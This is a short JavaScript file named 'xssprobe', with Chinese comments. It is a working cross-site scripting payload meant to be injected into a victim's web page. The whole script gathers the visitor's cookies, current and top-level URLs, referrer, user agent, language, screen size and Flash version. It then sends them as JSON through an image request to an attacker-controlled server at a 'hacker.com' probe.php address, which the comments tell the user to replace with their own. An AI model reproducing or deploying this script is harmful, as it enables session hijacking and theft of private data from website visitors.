/*
xssprobe
by evilcos@gmail.com | @xeyeteam

*/

(function(w,d,n) {
	/*
		缩短变量长度
		w:window, d:document, n:navigator

		by ChiChou
		2013-10-30
		http://ChiChou.0ginr.com/
	*/
	
	// 获取隐私信息的服务端页面，这里需配置为自己的probe.php网址
	var config = {
		server: "http://www.hacker.com/xssprobe/probe.php?c="
	};

	//字符串常量
	var U = 'unknown';

 	// 隐私信息字典
	var info = {
		browser: (function() {
			ua = n.userAgent.toLowerCase();
			var rwebkit = /(webkit)[ \/]([\w.]+)/;
			var ropera = /(opera)(?:.*version)?[ \/]([\w.]+)/;
			var rmsie = /(msie) ([\w.]+)/;
			var rmozilla = /(mozilla)(?:.*? rv:([\w.]+))?/;
			var match = rwebkit.exec( ua ) ||
				ropera.exec( ua ) ||
				rmsie.exec( ua ) ||
				ua.indexOf("compatible") < 0 && rmozilla.exec( ua ) ||
				[];
			return {name: match[1] || "", version: match[2] || "0"};
		})(),
		ua: escape(n.userAgent),
		lang: n.language,
		referrer: escape(d.referrer),
		location: escape(w.location.href),
		toplocation: escape(top.location.href),
		cookie: escape(d.cookie),
		domain: d.domain,
		title: d.title,
		screen: self.screen ? screen.width + "x" + screen.height : U,
		flash: (function() {
			if (n.plugins && n.plugins.length) {
				for (var i = 0; i<n.plugins.length; i++) {
					var match = n.plugins[i].description.match(/^Shockwave Flash ([\s\S]*)$/);
					if (match && match.length === 2)
						return match[1];					
				}
			} else if (typeof window.ActiveXObject === "function") {
				//等flash出到20那天再改吧
				for (var i = 20; i>=2; i--) {
					try {
						if (new ActiveXObject('ShockwaveFlash.ShockwaveFlash.' + i)) 
							return i + '.0';						
					}
					catch(e) {}
				}
			} else {
				return U
			}
		})()
	};

	// 编码JSON格式
	var	encode = function(o) {
		if(window.JSON && typeof JSON.stringify === "function") 
			return JSON.stringify(o)

		var arr = [];
		for (var i in o)
			arr.push("'" + i + "':" + (function(s) {
				if (typeof s == 'object' && s != null)
					return encode(s);
				return /^(string|number)$/.test(typeof s) ? "'" + s + "'" : s;
			})(o[i])
		);
		return '{' + arr.join(',') + '}';
	}
	// GET方法发送信息到远程服务器
	new Image().src = config.server + encode(info);
})(window, document, navigator);